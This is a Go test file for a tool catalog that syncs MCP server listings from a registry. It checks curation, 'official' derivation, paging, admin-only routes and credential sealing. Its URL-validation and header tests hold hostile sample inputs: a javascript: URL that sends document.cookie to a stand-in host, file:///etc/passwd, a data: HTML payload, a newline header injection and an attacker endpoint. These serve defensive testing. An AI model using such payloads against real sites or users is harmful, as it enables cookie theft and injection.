package tools

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"

	"github.com/zap-proto/zip"
)

// catalog_test.go pins the four claims the catalog rests on: a sync is
// IDEMPOTENT, curation SURVIVES it, "official" means something checkable, and a
// hidden listing is off the org's shelf without being out of the catalog.

// registry stands in for registry.modelcontextprotocol.io, paginating exactly the
// way it does — a cursor in metadata.nextCursor, absent on the last page.
func registry(t *testing.T, pages ...[]map[string]any) (*httptest.Server, *int) {
	t.Helper()
	hits := 0
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		hits++
		n := 0
		if c := r.URL.Query().Get("cursor"); c != "" {
			_, _ = fmt.Sscanf(c, "p%d", &n)
		}
		if n >= len(pages) {
			n = len(pages) - 1
		}
		body := map[string]any{"servers": pages[n], "metadata": map[string]any{}}
		if n+1 < len(pages) {
			body["metadata"] = map[string]any{"nextCursor": fmt.Sprintf("p%d", n+1)}
		}
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(body)
	}))
	t.Cleanup(ts.Close)
	return ts, &hits
}

// entry is one upstream server record in the registry's own shape.
func entry(name, desc string, remotes []map[string]any, packages []map[string]any) map[string]any {
	return map[string]any{"server": map[string]any{
		"name": name, "description": desc, "version": "1.0.0",
		"remotes": remotes, "packages": packages,
	}}
}

func remote(url string) []map[string]any {
	return []map[string]any{{"type": "streamable-http", "url": url}}
}

func stdio(id string) []map[string]any {
	return []map[string]any{{"registryType": "npm", "identifier": id, "runtimeHint": "npx",
		"transport": map[string]any{"type": "stdio"}}}
}

func catalogOf(t *testing.T, ts *httptest.Server) *CatalogStore {
	t.Helper()
	t.Setenv("CLOUD_TOOLS_REGISTRY", ts.URL)
	c, err := OpenCatalogStore(t.TempDir() + "/catalog.db")
	if err != nil {
		t.Fatalf("OpenCatalogStore: %v", err)
	}
	t.Cleanup(func() { _ = c.Close() })
	return c
}

// TestSyncIsIdempotent: syncing twice over an unchanged registry leaves ONE copy
// and reports nothing new. A catalog that grew on every pass would be a catalog
// nobody could trust a count from.
func TestSyncIsIdempotent(t *testing.T) {
	ts, _ := registry(t,
		[]map[string]any{entry("com.stripe/mcp", "payments", remote("https://mcp.stripe.com"), nil)},
		[]map[string]any{entry("io.github.alice/weather", "weather", nil, stdio("@alice/weather"))},
	)
	c := catalogOf(t, ts)
	ctx := context.Background()

	added, updated, err := c.Sync(ctx)
	if err != nil {
		t.Fatalf("first sync: %v", err)
	}
	if added != 2 || updated != 0 {
		t.Fatalf("first sync want added=2 updated=0, got %d/%d", added, updated)
	}

	added, updated, err = c.Sync(ctx)
	if err != nil {
		t.Fatalf("second sync: %v", err)
	}
	if added != 0 || updated != 0 {
		t.Fatalf("second sync must change nothing, got added=%d updated=%d", added, updated)
	}
	total, err := c.Count(ctx)
	if err != nil {
		t.Fatalf("Count: %v", err)
	}
	if total != 2 {
		t.Fatalf("two syncs must leave ONE copy of each listing, got %d rows", total)
	}
}

// TestSyncReportsWhatChanged: a publisher's edit is an update, not a second row.
func TestSyncReportsWhatChanged(t *testing.T) {
	first := []map[string]any{entry("com.stripe/mcp", "payments", remote("https://mcp.stripe.com"), nil)}
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_ = json.NewEncoder(w).Encode(map[string]any{"servers": first, "metadata": map[string]any{}})
	}))
	defer ts.Close()
	c := catalogOf(t, ts)
	ctx := context.Background()

	if _, _, err := c.Sync(ctx); err != nil {
		t.Fatalf("sync: %v", err)
	}
	first = []map[string]any{entry("com.stripe/mcp", "payments and payouts", remote("https://mcp.stripe.com"), nil)}
	added, updated, err := c.Sync(ctx)
	if err != nil {
		t.Fatalf("resync: %v", err)
	}
	if added != 0 || updated != 1 {
		t.Fatalf("an edited listing is 1 update and 0 additions, got %d/%d", added, updated)
	}
	l, err := c.Get(ctx, "com.stripe_mcp")
	if err != nil {
		t.Fatalf("Get: %v", err)
	}
	if l.Description != "payments and payouts" {
		t.Fatalf("the publisher's edit did not land: %q", l.Description)
	}
}

// TestCurationSurvivesSync: what WE decided is not upstream's to overwrite. This
// is the whole reason the copy is canonical rather than a cache.
func TestCurationSurvivesSync(t *testing.T) {
	ts, _ := registry(t, []map[string]any{
		entry("com.stripe/mcp", "payments", remote("https://mcp.stripe.com"), nil),
	})
	c := catalogOf(t, ts)
	ctx := context.Background()
	if _, _, err := c.Sync(ctx); err != nil {
		t.Fatalf("sync: %v", err)
	}

	yes, no := true, false
	logo := "https://cdn.example.com/stripe.svg"
	// Official is DERIVED true here (mcp.stripe.com is stripe.com's own host), so
	// setting it false is the case that matters: an admin overriding the
	// derivation must not be re-derived over.
	if _, err := c.Curate(ctx, "com.stripe_mcp", Curation{Hidden: &yes, Featured: &yes, Official: &no, Logo: &logo}); err != nil {
		t.Fatalf("Curate: %v", err)
	}
	if _, _, err := c.Sync(ctx); err != nil {
		t.Fatalf("resync: %v", err)
	}
	l, err := c.Get(ctx, "com.stripe_mcp")
	if err != nil {
		t.Fatalf("Get: %v", err)
	}
	switch {
	case !l.Hidden:
		t.Fatal("a sync un-hid a listing an admin hid")
	case !l.Featured:
		t.Fatal("a sync un-featured a listing an admin featured")
	case l.Official:
		t.Fatal("a sync re-derived official over an admin's decision")
	case l.Logo != logo:
		t.Fatalf("a sync replaced an admin's logo: %q", l.Logo)
	}
}

// TestOfficialDerivation: "official" is the VENDOR'S own server, and the answer is
// mechanical — the namespace must name a domain, and that domain must serve the
// listing. A re-hoster's proxy and a forge account are not official.
func TestOfficialDerivation(t *testing.T) {
	cases := []struct {
		name string
		l    MCPListing
		want bool
	}{
		{"vendor serves its own endpoint",
			MCPListing{Vendor: "com.stripe", Remotes: []MCPRemote{{Transport: "streamable-http", URL: "https://mcp.stripe.com"}}}, true},
		{"vendor serves it on the bare domain",
			MCPListing{Vendor: "ac.inference.sh", Remotes: []MCPRemote{{Transport: "streamable-http", URL: "https://sh.inference.ac"}}}, true},
		{"the forge itself, from its own repo",
			MCPListing{Vendor: "com.github", Repo: "https://github.com/github/github-mcp-server"}, true},
		{"a proxy on someone else's host",
			MCPListing{Vendor: "com.thenextgennexus", Remotes: []MCPRemote{{Transport: "streamable-http",
				URL: "https://nexgendata-mcp-proxy.steve-corbeil.workers.dev/github-mcp-server/mcp"}}}, false},
		{"a forge ACCOUNT is not a domain",
			MCPListing{Vendor: "io.github.alice", Repo: "https://github.com/alice/weather"}, false},
		{"a namespace that serves nothing",
			MCPListing{Vendor: "com.mcparmory", Repo: "https://github.com/mcparmory/registry"}, false},
		{"a single label is not a domain",
			MCPListing{Vendor: "local", Site: "https://local"}, false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := isOfficial(tc.l); got != tc.want {
				t.Fatalf("isOfficial(%s) = %v, want %v", tc.l.Vendor, got, tc.want)
			}
		})
	}
}

// TestOfficialIsDerivedOnSync: the derivation runs where the data arrives, so a
// synced catalog is already telling vendors' own servers from copies of them.
func TestOfficialIsDerivedOnSync(t *testing.T) {
	ts, _ := registry(t, []map[string]any{
		entry("com.stripe/mcp", "payments", remote("https://mcp.stripe.com"), nil),
		entry("ai.rehoster/stripe", "payments, resold", remote("https://server.rehoster.example/stripe/mcp"), nil),
	})
	c := catalogOf(t, ts)
	ctx := context.Background()
	if _, _, err := c.Sync(ctx); err != nil {
		t.Fatalf("sync: %v", err)
	}
	mine, err := c.Get(ctx, "com.stripe_mcp")
	if err != nil {
		t.Fatalf("Get: %v", err)
	}
	theirs, err := c.Get(ctx, "ai.rehoster_stripe")
	if err != nil {
		t.Fatalf("Get: %v", err)
	}
	if !mine.Official {
		t.Fatal("stripe.com serving mcp.stripe.com is the vendor's own server")
	}
	if theirs.Official {
		t.Fatal("a listing served from a host the namespace does not own is not official")
	}
}

// TestTransportsAreRecorded: the shelf has to say which listings can be enabled
// here and now, so the transport set is on every row rather than implied.
func TestTransportsAreRecorded(t *testing.T) {
	ts, _ := registry(t, []map[string]any{
		entry("com.stripe/mcp", "payments", remote("https://mcp.stripe.com"), nil),
		entry("io.github.alice/weather", "weather", nil, stdio("@alice/weather")),
	})
	c := catalogOf(t, ts)
	ctx := context.Background()
	if _, _, err := c.Sync(ctx); err != nil {
		t.Fatalf("sync: %v", err)
	}
	hosted, _ := c.Get(ctx, "com.stripe_mcp")
	if strings.Join(hosted.Transports, ",") != "streamable-http" || hosted.Endpoint() == "" {
		t.Fatalf("a hosted listing must report its endpoint: %+v", hosted)
	}
	pkg, _ := c.Get(ctx, "io.github.alice_weather")
	if strings.Join(pkg.Transports, ",") != "stdio" || pkg.Endpoint() != "" {
		t.Fatalf("a package-only listing has nothing to reach: %+v", pkg)
	}
	if len(pkg.Packages) != 1 || pkg.Packages[0].Runtime != "npx" {
		t.Fatalf("the runtime that would launch it must be kept: %+v", pkg.Packages)
	}
}

// TestSyncWalksEveryPage: the cursor is followed to the end, so a catalog is the
// whole registry and not its first page.
func TestSyncWalksEveryPage(t *testing.T) {
	ts, hits := registry(t,
		[]map[string]any{entry("com.a/one", "a", remote("https://mcp.a.com"), nil)},
		[]map[string]any{entry("com.b/two", "b", remote("https://mcp.b.com"), nil)},
		[]map[string]any{entry("com.c/three", "c", remote("https://mcp.c.com"), nil)},
	)
	c := catalogOf(t, ts)
	added, _, err := c.Sync(context.Background())
	if err != nil {
		t.Fatalf("sync: %v", err)
	}
	if added != 3 || *hits != 3 {
		t.Fatalf("want 3 listings over 3 pages, got %d listings over %d requests", added, *hits)
	}
}

// TestBrandNamesThePublisher: an enabled listing's tools are prefixed with the
// word a person would use for the vendor, because that prefix is what a model
// reads.
func TestBrandNamesThePublisher(t *testing.T) {
	for vendor, want := range map[string]string{
		"com.stripe":      "stripe-com",
		"ai.smithery":     "smithery-ai",
		"ac.inference.sh": "sh-inference-ac",
		"io.github.alice": "alice-github-io",
		"local":           "local",
		// The whole reason it names the domain: anyone can own stripe.sh, and a
		// handle taken from one label would render their tools as "stripe_…".
		"sh.stripe": "stripe-sh",
	} {
		if got := brand(vendor); got != want {
			t.Fatalf("brand(%q) = %q, want %q", vendor, got, want)
		}
	}
}

// ── the routes ──────────────────────────────────────────────────────────────────

// shelf mounts the tool plane, points it at a test registry, and syncs — the
// state every route test below starts from.
func shelf(t *testing.T, entries ...map[string]any) *zip.App {
	t.Helper()
	ts, _ := registry(t, entries)
	app := newApp(t, nil)
	t.Setenv("CLOUD_TOOLS_REGISTRY", ts.URL)
	if r := send(t, app, http.MethodPost, "/v1/tools/catalog/sync", "admin", nil, true); r.Code != 200 {
		t.Fatalf("sync: %d (%s)", r.Code, r.Body)
	}
	return app
}

// catalogIDs is the listing ids the catalog route returns for a caller.
func catalogIDs(t *testing.T, app *zip.App, org string, admin bool, query string) map[string]bool {
	t.Helper()
	r := send(t, app, http.MethodGet, "/v1/tools/catalog"+query, org, nil, admin)
	if r.Code != 200 {
		t.Fatalf("list catalog: %d (%s)", r.Code, r.Body)
	}
	var out struct {
		Catalog []MCPListing `json:"catalog"`
		Total   int          `json:"total"`
		Limit   int          `json:"limit"`
		Offset  int          `json:"offset"`
	}
	if err := json.Unmarshal(r.Body, &out); err != nil {
		t.Fatalf("catalog shape: %v (%s)", err, r.Body)
	}
	if len(out.Catalog) > out.Limit {
		t.Fatalf("a page of %d exceeds the limit %d it says it applied", len(out.Catalog), out.Limit)
	}
	if out.Total < len(out.Catalog) {
		t.Fatalf("total %d is under the %d listings on this page", out.Total, len(out.Catalog))
	}
	ids := map[string]bool{}
	for _, l := range out.Catalog {
		ids[l.ID] = true
	}
	return ids
}

// TestSyncIsAdminOnly: pulling a third party's registry into the canonical copy is
// a platform act, and the gate is a server-side predicate on the validated
// principal — never a field of the request.
func TestSyncIsAdminOnly(t *testing.T) {
	app := shelf(t, entry("com.stripe/mcp", "payments", remote("https://mcp.stripe.com"), nil))
	if r := do(t, app, http.MethodPost, "/v1/tools/catalog/sync", "acme", nil); r.Code != 403 {
		t.Fatalf("a tenant syncing the catalog want 403, got %d (%s)", r.Code, r.Body)
	}
	if r := do(t, app, http.MethodPost, "/v1/tools/catalog/sync", "", nil); r.Code != 403 {
		t.Fatalf("an unauthenticated sync want 403, got %d (%s)", r.Code, r.Body)
	}
}

// TestHiddenIsOffTheShelfNotOutOfTheCatalog: a hidden listing is absent for an
// org — in the list AND behind its own id — and present for the admin who is
// deciding whether to put it back. One query answers both, so they cannot drift.
func TestHiddenIsOffTheShelfNotOutOfTheCatalog(t *testing.T) {
	app := shelf(t,
		entry("com.stripe/mcp", "payments", remote("https://mcp.stripe.com"), nil),
		entry("com.sketchy/mcp", "trust me", remote("https://mcp.sketchy.com"), nil),
	)
	if r := send(t, app, http.MethodPatch, "/v1/tools/catalog/com.sketchy_mcp", "admin",
		map[string]any{"hidden": true}, true); r.Code != 200 {
		t.Fatalf("curate: %d (%s)", r.Code, r.Body)
	}

	org := catalogIDs(t, app, "acme", false, "")
	if org["com.sketchy_mcp"] {
		t.Fatalf("a hidden listing is on the org's shelf: %v", org)
	}
	if !org["com.stripe_mcp"] {
		t.Fatalf("hiding one listing removed another: %v", org)
	}
	if adm := catalogIDs(t, app, "admin", true, ""); !adm["com.sketchy_mcp"] {
		t.Fatalf("an admin cannot see what an admin hid: %v", adm)
	}

	// The detail page obeys the same rule: a shelf that renders what it will not
	// list would be a way around the shelf.
	if r := do(t, app, http.MethodGet, "/v1/tools/catalog/com.sketchy_mcp", "acme", nil); r.Code != 404 {
		t.Fatalf("hidden detail for a tenant want 404, got %d (%s)", r.Code, r.Body)
	}
	if r := send(t, app, http.MethodGet, "/v1/tools/catalog/com.sketchy_mcp", "admin", nil, true); r.Code != 200 {
		t.Fatalf("hidden detail for an admin want 200, got %d (%s)", r.Code, r.Body)
	}
}

// TestCurationIsAdminOnly: a tenant cannot feature itself onto the front of
// everyone else's shelf.
func TestCurationIsAdminOnly(t *testing.T) {
	app := shelf(t, entry("com.stripe/mcp", "payments", remote("https://mcp.stripe.com"), nil))
	if r := do(t, app, http.MethodPatch, "/v1/tools/catalog/com.stripe_mcp", "acme",
		map[string]any{"featured": true}); r.Code != 403 {
		t.Fatalf("a tenant curating want 403, got %d (%s)", r.Code, r.Body)
	}
	if r := send(t, app, http.MethodPatch, "/v1/tools/catalog/nope", "admin",
		map[string]any{"featured": true}, true); r.Code != 404 {
		t.Fatalf("curating a listing that is not there want 404, got %d (%s)", r.Code, r.Body)
	}
}

// TestFiltersNarrowTheShelf: featured and official are the two axes a storefront
// cuts on, and each is exactly the flag it names.
func TestFiltersNarrowTheShelf(t *testing.T) {
	app := shelf(t,
		entry("com.stripe/mcp", "payments", remote("https://mcp.stripe.com"), nil),
		entry("ai.rehoster/stripe", "payments, resold", remote("https://server.rehoster.example/mcp"), nil),
	)
	if r := send(t, app, http.MethodPatch, "/v1/tools/catalog/com.stripe_mcp", "admin",
		map[string]any{"featured": true}, true); r.Code != 200 {
		t.Fatalf("curate: %d (%s)", r.Code, r.Body)
	}
	if ids := catalogIDs(t, app, "acme", false, "?featured=true"); len(ids) != 1 || !ids["com.stripe_mcp"] {
		t.Fatalf("?featured=true must be exactly the featured listing: %v", ids)
	}
	if ids := catalogIDs(t, app, "acme", false, "?official=true"); len(ids) != 1 || !ids["com.stripe_mcp"] {
		t.Fatalf("?official=true must be exactly the vendor's own server: %v", ids)
	}
	if ids := catalogIDs(t, app, "acme", false, "?q=resold"); len(ids) != 1 || !ids["ai.rehoster_stripe"] {
		t.Fatalf("?q must search the description: %v", ids)
	}
}

// TestEnablingAListingIsTheSameRegistration: picking a listing off the shelf
// writes the SAME record typing a URL in does, so there is one thing an org has
// and one place it lives. Enabling twice is one server, not two.
func TestEnablingAListingIsTheSameRegistration(t *testing.T) {
	app := shelf(t,
		entry("com.stripe/mcp", "payments", remote("https://mcp.stripe.com"), nil),
		entry("io.github.alice/weather", "weather", nil, stdio("@alice/weather")),
	)
	r := do(t, app, http.MethodPost, "/v1/mcp/servers", "acme", map[string]any{"listing": "com.stripe_mcp"})
	if r.Code != 201 {
		t.Fatalf("enable: %d (%s)", r.Code, r.Body)
	}
	var srv MCPServer
	if err := json.Unmarshal(r.Body, &srv); err != nil {
		t.Fatalf("server shape: %v (%s)", err, r.Body)
	}
	switch {
	case srv.ID != "stripe-com":
		t.Fatalf("the server id must name the vendor's DOMAIN, got %q", srv.ID)
	case srv.URL != "https://mcp.stripe.com":
		t.Fatalf("the endpoint must come from the listing, got %q", srv.URL)
	case srv.Source != "catalog":
		t.Fatalf("the record must say where it came from, got %q", srv.Source)
	case srv.Listing != "com.stripe_mcp":
		t.Fatalf("the record must name the listing, got %q", srv.Listing)
	}

	// Twice is once: a retried enable revises the same row rather than adding a
	// near-duplicate whose tools would collide with the first's.
	if r := do(t, app, http.MethodPost, "/v1/mcp/servers", "acme",
		map[string]any{"listing": "com.stripe_mcp"}); r.Code != 201 {
		t.Fatalf("re-enable: %d (%s)", r.Code, r.Body)
	}
	list := do(t, app, http.MethodGet, "/v1/mcp/servers", "acme", nil)
	var out struct {
		Servers []MCPServer `json:"servers"`
	}
	if err := json.Unmarshal(list.Body, &out); err != nil {
		t.Fatalf("list shape: %v (%s)", err, list.Body)
	}
	if len(out.Servers) != 1 {
		t.Fatalf("enabling one listing twice must leave one server, got %d", len(out.Servers))
	}

	// A listing with nothing to reach is refused with the reason, not enabled into
	// a server that cannot answer.
	r = do(t, app, http.MethodPost, "/v1/mcp/servers", "acme", map[string]any{"listing": "io.github.alice_weather"})
	if r.Code != 422 {
		t.Fatalf("enabling a package-only listing want 422, got %d (%s)", r.Code, r.Body)
	}
	if !strings.Contains(string(r.Body), "streamable-http") {
		t.Fatalf("the refusal must say what is missing: %s", r.Body)
	}

	// Naming both a url and a listing is asking for two servers.
	r = do(t, app, http.MethodPost, "/v1/mcp/servers", "acme",
		map[string]any{"listing": "com.stripe_mcp", "url": "https://elsewhere.example/mcp", "name": "x"})
	if r.Code != 400 {
		t.Fatalf("url AND listing want 400, got %d (%s)", r.Code, r.Body)
	}
}

// TestTypedRegistrationStillWorks: the URL path an org already had is untouched by
// the catalog arriving beside it.
func TestTypedRegistrationStillWorks(t *testing.T) {
	app := newApp(t, nil)
	r := do(t, app, http.MethodPost, "/v1/mcp/servers", "acme",
		map[string]any{"name": "mine", "url": "https://mcp.example.com/rpc"})
	if r.Code != 201 {
		t.Fatalf("register: %d (%s)", r.Code, r.Body)
	}
	var srv MCPServer
	_ = json.Unmarshal(r.Body, &srv)
	if srv.Source != "org" || srv.Listing != "" {
		t.Fatalf("a hand-registered server came from the org, got source=%q listing=%q", srv.Source, srv.Listing)
	}
	if !strings.HasPrefix(srv.ID, "m") || strings.Contains(srv.ID, "_") {
		t.Fatalf("a hand-registered server keeps its random handle and no underscore, got %q", srv.ID)
	}
}

// TestSyncRefusesALoopingCursor: the cursor belongs to a third party, so a walk
// that trusted it to end could be made not to. A repeated cursor is the loop, and
// it is refused rather than followed — with what was already read kept, because a
// partial catalog is not a reason to throw away the part that was fine.
func TestSyncRefusesALoopingCursor(t *testing.T) {
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		n := r.URL.Query().Get("cursor")
		name := "com.one/mcp"
		if n != "" {
			name = "com.two/mcp"
		}
		_ = json.NewEncoder(w).Encode(map[string]any{
			"servers":  []map[string]any{entry(name, "x", remote("https://mcp.example.com"), nil)},
			"metadata": map[string]any{"nextCursor": "always-the-same"},
		})
	}))
	defer ts.Close()
	c := catalogOf(t, ts)

	added, _, err := c.Sync(context.Background())
	if err == nil {
		t.Fatal("a cursor that repeats must be refused, not followed forever")
	}
	if !strings.Contains(err.Error(), "repeated") {
		t.Fatalf("the refusal must name the loop, got %v", err)
	}
	if added == 0 {
		t.Fatal("the pages that were read before the loop must be kept")
	}
}

// TestAFailedSealNeverCostsAnExistingServer: sealing the credential is the step
// AFTER the row is written, so a KMS failure has to be undone — and the undo is
// not the same in both directions. Deleting is right for a row the request
// created; for a re-enable it would turn a KMS hiccup into the org's working
// server disappearing.
func TestAFailedSealNeverCostsAnExistingServer(t *testing.T) {
	app := shelf(t, entry("com.stripe/mcp", "payments", remote("https://mcp.stripe.com"), nil))
	mounted.State.kms = brokenKMS{}

	// A FRESH registration whose secret cannot be sealed leaves nothing behind: a
	// row claiming a credential that is not there would dispatch unauthenticated.
	if r := do(t, app, http.MethodPost, "/v1/mcp/servers", "acme",
		map[string]any{"listing": "com.stripe_mcp", "authHeader": "Authorization", "secret": "sk-live"}); r.Code != 500 {
		t.Fatalf("a failed seal want 500, got %d (%s)", r.Code, r.Body)
	}
	if n := serverCount(t, app, "acme"); n != 0 {
		t.Fatalf("a failed seal left %d rows behind", n)
	}

	// Now enable it for real, then re-enable with a secret that cannot be sealed.
	mounted.State.kms = nil
	if r := do(t, app, http.MethodPost, "/v1/mcp/servers", "acme",
		map[string]any{"listing": "com.stripe_mcp"}); r.Code != 201 {
		t.Fatalf("enable: %d (%s)", r.Code, r.Body)
	}
	mounted.State.kms = brokenKMS{}
	if r := do(t, app, http.MethodPost, "/v1/mcp/servers", "acme",
		map[string]any{"listing": "com.stripe_mcp", "authHeader": "Authorization", "secret": "sk-live"}); r.Code != 500 {
		t.Fatalf("a failed re-seal want 500, got %d (%s)", r.Code, r.Body)
	}
	if n := serverCount(t, app, "acme"); n != 1 {
		t.Fatalf("a failed re-seal must leave the org's server standing, got %d rows", n)
	}
}

// brokenKMS is a custody that refuses to seal — the hiccup, not the outage.
type brokenKMS struct{ fakeKMS }

func (brokenKMS) PutSecret(_ context.Context, _ string, _ []byte) error {
	return errors.New("kms unavailable")
}

func serverCount(t *testing.T, app *zip.App, org string) int {
	t.Helper()
	var out struct {
		Servers []MCPServer `json:"servers"`
	}
	r := do(t, app, http.MethodGet, "/v1/mcp/servers", org, nil)
	if err := json.Unmarshal(r.Body, &out); err != nil {
		t.Fatalf("list servers: %v (%s)", err, r.Body)
	}
	return len(out.Servers)
}

// ── what the review found ───────────────────────────────────────────────────────

// TestOfficialIsAboutTheEndpoint: the badge has to describe the field the reader
// is about to trust. Enablement consumes the ENDPOINT and nothing else, so a
// listing whose site is the vendor's while its endpoint is somewhere else is not
// official — that is precisely the shape a credential-stealing entry would take.
func TestOfficialIsAboutTheEndpoint(t *testing.T) {
	elsewhere := MCPListing{
		Vendor: "com.stripe", Site: "https://stripe.com",
		Remotes: []MCPRemote{{Transport: "streamable-http", URL: "https://evil.attacker.example/mcp"}},
	}
	if isOfficial(elsewhere) {
		t.Fatal("a listing served from a host the namespace does not own is not official, whatever its site says")
	}
	// With no endpoint at all there is nothing to enable, so the site is the only
	// thing left to judge and it still means something.
	if !isOfficial(MCPListing{Vendor: "com.stripe", Site: "https://stripe.com"}) {
		t.Fatal("a package-only listing on the vendor's own site is theirs")
	}
}

// TestUpstreamURLsAreDroppedUnlessAWebBrowserMayFollowThem: every one of these is
// RENDERED, and they come from a third party. javascript: is what arrives.
func TestUpstreamURLsAreDroppedUnlessAWebBrowserMayFollowThem(t *testing.T) {
	for _, bad := range []string{
		"javascript:fetch('https://evil/'+document.cookie)",
		"data:text/html;base64,PHNjcmlwdD4=", "file:///etc/passwd", "not a url at all", "",
	} {
		if got := webURL(bad); got != "" {
			t.Fatalf("webURL(%q) = %q, want it dropped", bad, got)
		}
	}
	if got := webURL("https://cdn.example.com/logo.svg"); got != "https://cdn.example.com/logo.svg" {
		t.Fatalf("a real https logo must survive, got %q", got)
	}
}

// TestSyncSkipsANameItCannotAddress: listingID's reversibility rests on a
// namespace never containing an underscore, and the id is the PRIMARY KEY. Two
// names that collide would let the second inherit the first's curation — its
// featured, admin-vouched standing — and replace its endpoint.
func TestSyncSkipsANameItCannotAddress(t *testing.T) {
	ts, _ := registry(t, []map[string]any{
		entry("com.foo_bar/mcp", "a namespace with an underscore", remote("https://mcp.foo.example"), nil),
		entry("com.evil/a/b", "two slashes", remote("https://mcp.evil.example"), nil),
		entry("com.good/mcp", "fine", remote("https://mcp.good.com"), nil),
	})
	c := catalogOf(t, ts)
	ctx := context.Background()
	added, _, err := c.Sync(ctx)
	if err != nil {
		t.Fatalf("sync: %v", err)
	}
	if added != 1 {
		t.Fatalf("only the addressable name may be stored, got %d rows", added)
	}
	if _, err := c.Get(ctx, "com.foo_bar_mcp"); err == nil {
		t.Fatal("a name outside the registry's own grammar was stored anyway")
	}
}

// TestAFailedSealLeavesNoRowClaimingACredential: the credential is sealed BEFORE
// the row, so a KMS failure leaves the store as it was. A row asserting a
// credential nobody stored does not fail loudly — the listing errors, the provider
// skips the server, and its tools vanish from the org's plane in silence.
func TestAFailedSealLeavesNoRowClaimingACredential(t *testing.T) {
	app := shelf(t, entry("com.stripe/mcp", "payments", remote("https://mcp.stripe.com"), nil))
	if r := do(t, app, http.MethodPost, "/v1/mcp/servers", "acme",
		map[string]any{"listing": "com.stripe_mcp"}); r.Code != 201 {
		t.Fatalf("enable: %d (%s)", r.Code, r.Body)
	}
	mounted.State.kms = brokenKMS{}
	if r := do(t, app, http.MethodPost, "/v1/mcp/servers", "acme",
		map[string]any{"listing": "com.stripe_mcp", "authHeader": "Authorization", "secret": "sk-live"}); r.Code != 500 {
		t.Fatalf("a failed re-seal want 500, got %d (%s)", r.Code, r.Body)
	}
	srv, err := mounted.State.servers.Get(context.Background(), "acme", "stripe-com")
	if err != nil {
		t.Fatalf("the org's server must still be there: %v", err)
	}
	if srv.HasSecret {
		t.Fatal("the row claims a credential the failed seal never stored")
	}
}

// TestDeregisteringDestroysTheCredential: a customer's secret must not outlive the
// thing it belonged to — that is what a deletion request and a rotation both mean.
func TestDeregisteringDestroysTheCredential(t *testing.T) {
	app := shelf(t, entry("com.stripe/mcp", "payments", remote("https://mcp.stripe.com"), nil))
	kms := recordingKMS{}
	mounted.State.kms = kms
	if r := do(t, app, http.MethodPost, "/v1/mcp/servers", "acme",
		map[string]any{"listing": "com.stripe_mcp", "authHeader": "Authorization", "secret": "sk-live"}); r.Code != 201 {
		t.Fatalf("enable: %d (%s)", r.Code, r.Body)
	}
	if string(kms[authRef("acme", "stripe-com")]) != "sk-live" {
		t.Fatalf("the credential was not sealed: %v", kms)
	}
	if r := do(t, app, http.MethodDelete, "/v1/mcp/servers/stripe-com", "acme", nil); r.Code != 204 {
		t.Fatalf("deregister: %d (%s)", r.Code, r.Body)
	}
	if v := kms[authRef("acme", "stripe-com")]; len(v) != 0 {
		t.Fatalf("the credential outlived the server it belonged to: %q", v)
	}
}

// TestABadHeaderNameIsRefusedAtRegistration: net/http rejects it when the request
// is BUILT, which is hours later inside a background listing, where the symptom is
// a server whose tools quietly never appear.
func TestABadHeaderNameIsRefusedAtRegistration(t *testing.T) {
	app := newApp(t, nil)
	for _, bad := range []string{"Auth orization", "X-Api-Key:", "X\nInjected"} {
		r := do(t, app, http.MethodPost, "/v1/mcp/servers", "acme",
			map[string]any{"name": "x", "url": "https://mcp.example.com/rpc", "authHeader": bad})
		if r.Code != 400 {
			t.Fatalf("authHeader %q want 400, got %d (%s)", bad, r.Code, r.Body)
		}
	}
	if r := do(t, app, http.MethodPost, "/v1/mcp/servers", "acme",
		map[string]any{"name": "x", "url": "https://mcp.example.com/rpc", "authHeader": "X-Api-Key"}); r.Code != 201 {
		t.Fatalf("a real header name must be accepted, got %d (%s)", r.Code, r.Body)
	}
}

// TestTheCatalogIsPaged: the public registry publishes tens of thousands of
// servers, so an unbounded list is a twenty-megabyte response any org member can
// ask for in a loop.
func TestTheCatalogIsPaged(t *testing.T) {
	many := make([]map[string]any, 0, 120)
	for i := 0; i < 120; i++ {
		many = append(many, entry(fmt.Sprintf("com.v%03d/mcp", i), "x", remote("https://mcp.example.com"), nil))
	}
	app := shelf(t, many...)

	first := catalogIDs(t, app, "acme", false, "")
	if len(first) != catalogPage {
		t.Fatalf("the default page is %d listings, got %d", catalogPage, len(first))
	}
	page2 := catalogIDs(t, app, "acme", false, "?offset=50")
	for id := range page2 {
		if first[id] {
			t.Fatalf("the second page repeats %q from the first", id)
		}
	}
	if over := catalogIDs(t, app, "acme", false, "?limit=9999"); len(over) > catalogMax {
		t.Fatalf("a limit past the maximum must be clamped to %d, got %d", catalogMax, len(over))
	}
}

// recordingKMS is a custody that remembers what it was told to hold, so a test can
// see a credential arrive and then be destroyed.
type recordingKMS map[string][]byte

func (k recordingKMS) GetSecret(_ context.Context, ref string) ([]byte, error) {
	if v, ok := k[ref]; ok {
		return v, nil
	}
	return nil, errors.New("no such secret")
}
func (k recordingKMS) PutSecret(_ context.Context, ref string, v []byte) error {
	k[ref] = v
	return nil
}
func (recordingKMS) Sign(context.Context, string, []byte) ([]byte, error) {
	return nil, errors.New("not signing")
}

// TestConcurrentEnablesAreOneServer: Resolve reads and Write writes, so two
// requests can pass through the gap between them — a double-clicked Enable is the
// ordinary way that happens. The second becomes the revise it would have been had
// it arrived a moment later, rather than a 500 nobody can act on.
func TestConcurrentEnablesAreOneServer(t *testing.T) {
	app := shelf(t, entry("com.stripe/mcp", "payments", remote("https://mcp.stripe.com"), nil))
	var wg sync.WaitGroup
	codes := make([]int, 8)
	for i := range codes {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			codes[i] = do(t, app, http.MethodPost, "/v1/mcp/servers", "acme",
				map[string]any{"listing": "com.stripe_mcp"}).Code
		}(i)
	}
	wg.Wait()
	for i, c := range codes {
		if c != 201 {
			t.Fatalf("concurrent enable %d answered %d", i, c)
		}
	}
	if n := serverCount(t, app, "acme"); n != 1 {
		t.Fatalf("eight concurrent enables of one listing must leave one server, got %d", n)
	}
}
